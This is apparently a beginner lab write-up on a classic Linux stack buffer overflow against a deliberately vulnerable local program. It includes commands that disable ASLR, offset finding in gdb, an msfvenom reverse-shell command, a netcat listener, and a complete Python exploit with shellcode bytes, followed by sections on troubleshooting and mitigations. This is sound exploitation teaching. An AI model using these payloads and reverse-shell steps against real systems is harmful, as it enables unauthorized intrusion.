---
title: "Linux Buffer Overflow Foundation"
date: 2022-03-14
category: "buffer-overflow"
difficulty: "beginner"
source: "INE"
tags: [INE, beginner, gdb-peda, msfvenom, shellcode]
excerpt: "Buffer overflow fundamentals on Linux: overriding EIP, generating shellcode with msfvenom, finding the buffer address and landing a shell."
cover: "/writeups/linux-bo-foundation/bo_imagination.png"
draft: false
---

# Linux Buffer Overflow Foundation

> This write-up is security-education material. The target is a deliberately vulnerable program I compiled and run locally for learning. Only ever apply these techniques to systems you own or are explicitly authorized to test.

## 1. What is Buffer Overflow
Exploiting the behavior of a buffer overflow is a well-known security exploit. On many systems, the memory layout of a program, or the system as a whole, is well defined. By sending in data designed to cause a buffer overflow, it is possible to write into areas known to hold executable code and replace it with malicious code, or to selectively overwrite data pertaining to the program's state, therefore causing behavior that was not intended by the original programmer. Buffers are widespread in operating system (OS) code, so it is possible to make attacks that perform privilege escalation and gain unlimited access to the computer's resources. The famed Morris worm in 1988 used this as one of its attack techniques.

![bo_imagination.png](/writeups/linux-bo-foundation/bo_imagination.png)

### 1.1 The stack, frames, and the registers that matter

To understand *why* the attack below works, you need a mental model of the call stack on 32-bit x86:

- The **stack** grows *downward* (toward lower addresses) as functions are called. Each function call creates a **stack frame** holding its local variables, the saved base pointer, and the return address.
- **ESP** (stack pointer) — points to the top of the stack (lowest in-use address).
- **EBP** (base pointer) — anchors the current frame; locals are addressed relative to it.
- **EIP** (instruction pointer) — the address of the *next instruction the CPU will execute*. We never write `EIP` directly; we change it indirectly by overwriting the saved return address.

When `main` calls `overflow()`, the stack frame for `overflow()` looks roughly like this (higher addresses at the bottom):

```
   lower addresses
   ┌───────────────────────┐  <- ESP, top of stack
   │  char buffer[500]     │   our overflow writes upward through here ──┐
   │  int  userinput       │                                            │
   │  (alignment padding)  │                                            │ overflow
   │  saved EBP  (4 bytes) │                                            │ direction
   ├───────────────────────┤                                            │
   │  saved return address │  <- overwrite THIS to control EIP  <────────┘
   ├───────────────────────┤
   │  caller's frame ...   │
   └───────────────────────┘
   higher addresses
```

A `read()` (or `gets`, `strcpy`, …) that writes more bytes into `buffer` than it can hold keeps writing *upward* — past `userinput`, past padding, past the saved `EBP`, and into the **saved return address**. When `overflow()` finishes, the CPU pops that saved value into `EIP` and jumps to it. If we control those 4 bytes, we control where the program executes next.

### 1.2 The plan

This is a *beginner* lab with mitigations deliberately weakened (no stack canary, executable stack, ASLR off), so we use the simplest possible technique — **classic shellcode injection**:

1. Find the exact **offset** from the start of `buffer` to the saved return address.
2. Put executable **shellcode** (a reverse shell) into the buffer.
3. Overwrite the saved return address with an address that lands *inside* our shellcode, using a **NOP sled** to make the landing forgiving.

(Once mitigations are enabled this technique stops working — that is what the NX / canary / ASLR write-ups cover. This post is the foundation everything else builds on.)

## 2. Overflowing Program on Linux
### 2.1 Setting up environment
First, turn off Address Space Layout Randomization (ASLR):

```bash
$ echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

Why: with ASLR on, the stack base is randomized every run, so the address we hard-code as the return address would be wrong on the next execution. Disabling it makes the buffer's stack address stable so we can focus on the core overflow mechanics. (Defeating ASLR is a separate, more advanced topic — see the ASLR write-ups.)

Program source code:

```c
#include<stdio.h>
#include<unistd.h>

int overflow(){
  char buffer[500];
  int userinput;
  userinput = read(0, buffer, 700);
  printf("\nUser provided %d bytes. Buffer content: %s", userinput, buffer);
  return 0;
}

int main(int argc, char*argv[]){
  overflow();
  return 0;
}
```

The bug: `buffer` is 500 bytes but `read()` is allowed to read up to **700** bytes from stdin straight into it — a textbook unbounded write.

Compile with `gcc`, deliberately weakening two mitigations:

```sh
$ gcc oversize_overflow.c  -fno-stack-protector -z execstack -o oversize_overflow
```

- `-fno-stack-protector` — no stack canary. With the canary on, the overwrite of the saved return address would be detected and the program would abort with `*** stack smashing detected ***` before we could hijack `EIP`. Turning it off lets us study the raw overflow.
- `-z execstack` — make the stack **executable**. This is what allows the classic "shellcode in the buffer" technique: normally NX would make the stack non-executable and our shellcode would never run (that scenario is the subject of the NX-bypass write-up). Here we keep the stack executable on purpose.
- No `-m32` is shown, but the offsets and `EIP`/`struct.pack('<L', ...)` (4-byte addresses) below confirm this is a **32-bit** build; compile with `-m32` if your toolchain defaults to 64-bit.


### 2.2 Overriding EIP

The source says `char buffer[500]`, but **500 is not the offset to the return address**. Between the start of `buffer` and the saved return address the compiler also places `userinput`, alignment padding, and the 4-byte saved `EBP` (see the diagram in §1.1). So we must *measure* the real offset rather than assume it's 500. We do that by fuzzing to confirm a crash, then using a cyclic pattern to read off the exact offset.

Send 500 bytes of `A` first — likely not enough to reach past the saved return address:

```bash
$ python3 -c "print('A'*500)" | ./oversize_overflow
```

![image1.png](/writeups/linux-bo-foundation/image1.png)

The program runs fine — 500 bytes didn't reach far enough. Try the full 700 bytes the buggy `read()` allows:

```bash
$ python3 -c "print('A'*700)" | ./oversize_overflow
```

![image2.png](/writeups/linux-bo-foundation/image2.png)

This time it crashes — 700 bytes overran the saved return address and the CPU jumped to `0x41414141` (`"AAAA"`), an invalid address. A crash with `EIP` full of our bytes is the signal that we control the instruction pointer; now we need the *exact* offset where those 4 controlling bytes begin. Use gdb for that:

```bash
$ gdb -q oversize_overflow
```

In my gdb I've installed [peda](https://github.com/longld/peda), so you'll see extra tooling; any equivalent (`msf-pattern_create`, pwntools `cyclic`) works too.

A **cyclic pattern** is a De Bruijn sequence: every 4-byte window in it is unique. So whatever 4 bytes end up in `EIP` at the crash map back to exactly one position in the string — that position *is* the offset. Create the pattern and feed it in: 

```sh
gdb-peda$ pattern create 700 1.txt
Writing pattern of 700 chars to filename "1.txt"
gdb-peda$ r < 1.txt
```

![image3.png](/writeups/linux-bo-foundation/image3.png)

The crash shows `EIP = 0x4e734138` — that is a 4-byte slice of the pattern, not random. Ask peda which offset that slice came from:

```sh
gdb-peda$ pattern offset 0x4e734138
1316176184 found at offset: 516
```

So the offset is **516**: bytes 0–515 are filler, and bytes 516–519 land exactly on the saved return address. Note this is *not* 500 — the extra 16 bytes are `userinput` + alignment + saved `EBP`, exactly as the §1.1 diagram predicted. (This value is specific to this build; a different compiler/optimization level can shift it, which is why we measured rather than guessed.)

Verify the offset with a clean marker — 516 filler bytes, then 4 `B`s, then padding. If 516 is correct, `EIP` should become exactly `0x42424242` (`"BBBB"`):

```sh
$ python -c "print('A'*516+'B'*4+'C*100')" > input.txt
```

Running this in gdb, `EIP` is overwritten with `0x42424242` — confirmed. We now have full, precise control of the instruction pointer.

![image4.png](/writeups/linux-bo-foundation/image4.png)

### 2.3 Execute the Shellcode

Controlling `EIP` only lets us *jump* somewhere. To get a shell we need (a) executable code to jump to — the shellcode — and (b) a reliable address that lands inside it.

#### 2.3.1 Shellcode generation

Shellcode is a small position-independent blob of machine code; here a `linux/x86` reverse-TCP shell that connects back to our listener. We generate it with msfvenom:

```bash
$ msfvenom -p linux/x86/shell_reverse_tcp lhost=192.168.1.9 lport=4444 -b "\x00" -f python -o payload.py --platform linux -a x86
```

- Options description:

```sh
-p: Which mean payload
-b: bad characters caused crash
-f: file type
-o: output
-a: architecture
--platform: platform for the payload
lhost: listening host
lport: listening port
```

The `-b "\x00"` is important: our input reaches the buffer via `read()`, but many string operations and the program's own handling can choke on a NUL byte. Telling msfvenom that `\x00` is a **bad character** makes it encode the payload so the final shellcode contains no null bytes, so it survives intact in memory.

Before exploiting, start a listener on the attacker host so the reverse shell has somewhere to connect back to:

```bash
$ nc -lvnp 4444
```

![image5.png](/writeups/linux-bo-foundation/image5.png)

#### 2.3.2 Finding the returning address to execute the shellcode

We need an address that points *into* the buffer where our shellcode will sit. Fill the buffer with `A`s, crash it in gdb, then inspect the stack to find where the buffer lives in memory.

```bash
$ python -c "print('A'*700)" > input.txt

gdb-peda$ r < input.txt
```

After it crashes, dump the stack around the buffer with `x/20wx $esp-0x230` (we look *below* `ESP` because the buffer sits at lower addresses than the saved return address — see §1.1). You're looking for the run of `0x41414141` (`"AAAA"`) — that's our buffer:

![image6.png](/writeups/linux-bo-foundation/image6.png)

The block of `0x41414141` starts around `0xffffd030`; picking `0xffffd030 + 0x8 = 0xffffd038` lands a little way into the `A` region. We'll make the saved return address `0xffffd038`. We don't need pinpoint accuracy because of the NOP sled — explained next.

> **Why a NOP sled?** Exact stack addresses drift slightly between runs and environments (argv/env size, shell, etc.). A **NOP sled** is a run of `0x90` (NOP — "do nothing, go to next instruction") placed *before* the shellcode. As long as `EIP` lands *anywhere* in the sled, the CPU slides through the NOPs one by one until it falls into the real shellcode. This turns "hit one exact byte" into "hit anywhere in a 16-byte window", making the exploit far more reliable.

#### 2.3.3 Proof of Concept (PoC)

We now assemble the final payload. The layout, totalling the 516-byte offset plus the 4-byte return address, is:

```
[ NOP sled (16) ][ shellcode ][ 'A' filler ][ ret_addr = 0xffffd038 ]
└──────────────── 516 bytes total ─────────────┘└──── overwrites saved return ────┘
```

- **NOP sled (16 × `\x90`)** — the safe landing zone the return address points into.
- **shellcode** — the msfvenom reverse shell, executed after sliding through the sled.
- **`'A'` filler** — pads the remainder so that the *next* 4 bytes land exactly on the saved return address. Its length is `offset - len(nop) - len(shellcode)` = `516 - 16 - len(buf)`.
- **ret_addr `0xffffd038`** — overwrites the saved return address; points back into the NOP sled, so when `overflow()` returns the CPU slides into our shellcode.

`struct.pack('<L', 0xffffd038)` writes the address **little-endian** (the byte order x86 stores integers in), which is why it appears reversed in memory.

Edit `payload.py` (created above) into the final exploit:

```python
#!/usr/bin/python3
import struct

buf =  b""
buf += b"\xdb\xc3\xd9\x74\x24\xf4\x5d\x29\xc9\xbe\x4d\x2c\x0e"
buf += b"\xe0\xb1\x12\x83\xed\xfc\x31\x75\x13\x03\x38\x3f\xec"
buf += b"\x15\xf3\xe4\x07\x36\xa0\x59\xbb\xd3\x44\xd7\xda\x94"
buf += b"\x2e\x2a\x9c\x46\xf7\x04\xa2\xa5\x87\x2c\xa4\xcc\xef"
buf += b"\x6e\xfe\x2e\xe6\x06\xfd\x30\xe9\x8a\x88\xd0\xb9\x55"
buf += b"\xdb\x43\xea\x2a\xd8\xea\xed\x80\x5f\xbe\x85\x74\x4f"
buf += b"\x4c\x3d\xe1\xa0\x9d\xdf\x98\x37\x02\x4d\x08\xc1\x24"
buf += b"\xc1\xa5\x1c\x26"

with open('input.txt', 'wb') as file:
    offset = 516
    nop = b'\x90'*16
    junk = b'A'
    ret_add = struct.pack('<L', 0xffffd038)
    payload = nop + buf + junk * (offset - 16 -len(buf)) + ret_add
    file.write(payload)
```

Running it produces `input.txt`:

![image7.png](/writeups/linux-bo-foundation/image7.png)

Feed `input.txt` into the program (`./oversize_overflow < input.txt`) while the `nc` listener is running. The saved return address is overwritten with `0xffffd038`, the CPU slides down the NOP sled into the shellcode, and the reverse shell connects back to our listener:

![image8.png](/writeups/linux-bo-foundation/image8.png)

![image9.png](/writeups/linux-bo-foundation/image9.png)

## 3. Troubleshooting & notes

Common issues when reproducing this:

- **`EIP` isn't your control value.** The offset is wrong — re-derive it with the cyclic pattern. It changes with compiler/optimization/alignment; don't reuse 516 blindly on another binary.
- **Crash *inside* the shellcode region but no shell.** Often a bad character mangled the payload. Add the offending byte to msfvenom's `-b` list and regenerate.
- **Lands near the buffer but segfaults.** The return address missed the sled. Widen the NOP sled, or re-read the buffer's address from the stack dump under the *same* conditions you exploit in (run it the same way — argv/env changes shift stack addresses).
- **No connection on the listener.** Check `lhost`/`lport` match the `nc` listener, that the listener is started *before* sending the payload, and that no firewall blocks the port.
- **Works in gdb but not standalone.** gdb adds environment variables that shift the stack. Test outside gdb, or account for the offset (a wider sled usually absorbs it).

## 4. Mitigations

This exploit only works because the lab disables defences. In real systems:

- **NX / DEP** — non-executable stack; shellcode-in-buffer never runs (see the NX-bypass write-up for the ret2libc workaround).
- **Stack canary** (`-fstack-protector-strong`) — detects the saved-return overwrite before the function returns.
- **ASLR** (`randomize_va_space = 2`) — randomizes the stack base so a hard-coded return address is wrong each run.
- **PIE + RELRO** — randomizes the binary and hardens the GOT.
- **Root cause fix** — the real bug is `read(0, buffer, 700)` into a 500-byte buffer; bounding the length to `sizeof(buffer)` removes the vulnerability entirely.

## 5. Reference

### 5.1 Foundational reading

- [Smashing The Stack For Fun And Profit — Aleph One, Phrack 49](http://phrack.org/issues/49/14.html) — the original 1996 paper that defined stack-overflow exploitation; still the single best starting point.
- [Buffer overflow — Wikipedia](https://en.wikipedia.org/wiki/Buffer_overflow) — overview, history (Morris worm), and mitigation landscape.
- [Stack buffer overflow — Wikipedia](https://en.wikipedia.org/wiki/Stack_buffer_overflow) — specifics of the stack-based variant covered here.
- [CWE-121: Stack-based Buffer Overflow](https://cwe.mitre.org/data/definitions/121.html) — the formal weakness classification, with examples and consequences.
- [Linux Exploit Development (INE)](https://my.ine.com/CyberSecurity/courses/eb1c83e7/linux-exploit-development) — the course this lab is based on.

### 5.2 Process memory, the stack & calling conventions

- [Anatomy of a Program in Memory — Gustavo Duarte](https://manybutfinite.com/post/anatomy-of-a-program-in-memory/) — clear walkthrough of the Linux process address space (stack, heap, text, data).
- [x86 calling conventions — Wikipedia](https://en.wikipedia.org/wiki/X86_calling_conventions) — `cdecl`, argument passing on the stack, who cleans up.
- [System V ABI (i386 & x86-64)](https://gitlab.com/x86-psABIs/x86-64-ABI) — the authoritative spec for stack layout and calling conventions on Linux.
- [Function prologue/epilogue — Wikipedia](https://en.wikipedia.org/wiki/Function_prologue_and_epilogue) — what `push ebp; mov ebp, esp` and `leave; ret` actually do to the frame.
- [Endianness — Wikipedia](https://en.wikipedia.org/wiki/Endianness) — why addresses are written little-endian (`struct.pack('<L', ...)`).

### 5.3 Tooling

- [GDB Documentation](https://sourceware.org/gdb/current/onlinedocs/gdb/) — `x`, `info registers`, breakpoints, examining the stack.
- [peda — Python Exploit Development Assistance for GDB](https://github.com/longld/peda) — provides `pattern create/offset`, `checksec` used in this write-up.
- [pwndbg](https://github.com/pwndbg/pwndbg) and [GEF](https://github.com/hugsy/gef) — modern, well-maintained alternatives to peda.
- [pwntools documentation](https://docs.pwntools.com/) — `cyclic`, `p32`/`u32`, `process`/`remote`; the standard exploit-dev library.
- [msfvenom — Offensive Security](https://www.offensive-security.com/metasploit-unleashed/msfvenom/) — payload generation, encoders, bad-char handling (`-b`).
- [pattern_create / De Bruijn sequence — Wikipedia](https://en.wikipedia.org/wiki/De_Bruijn_sequence) — the math behind unique-window offset finding.

### 5.4 Mitigations & where this goes next

- [Linux kernel ASLR (`randomize_va_space`) — kernel.org](https://www.kernel.org/doc/Documentation/admin-guide/sysctl/kernel.rst) — what each ASLR level does.
- [NX bit — Wikipedia](https://en.wikipedia.org/wiki/NX_bit) and [Executable-space protection](https://en.wikipedia.org/wiki/Executable-space_protection) — the defence that breaks shellcode-in-buffer.
- [Stack canaries / StackGuard — Wikipedia](https://en.wikipedia.org/wiki/Buffer_overflow_protection) — how `-fstack-protector` detects the overwrite.
- [Position-independent code (PIE) & RELRO — Red Hat hardening guide](https://www.redhat.com/en/blog/hardening-elf-binaries-using-relocation-read-only-relro) — binary/GOT hardening.
- [Return-to-libc attack — Wikipedia](https://en.wikipedia.org/wiki/Return-to-libc_attack) and [Return-oriented programming — Wikipedia](https://en.wikipedia.org/wiki/Return-oriented_programming) — the techniques used once NX is enabled.

### 5.5 Practice & deeper study

- [Nightmare — guyinatuxedo](https://guyinatuxedo.github.io/) — free, hands-on binary-exploitation course (beginner → advanced).
- [pwn.college](https://pwn.college/) — structured exploitation curriculum with graded challenges.
- [ROP Emporium](https://ropemporium.com/) — focused practice for the ret2libc/ROP follow-ups.
- [LiveOverflow — Binary Exploitation playlist](https://www.youtube.com/playlist?list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN) — video walkthroughs of these concepts.
- Follow-ups in this series: NX bypass with ret2libc, stack canary bypass, ASLR bypass.
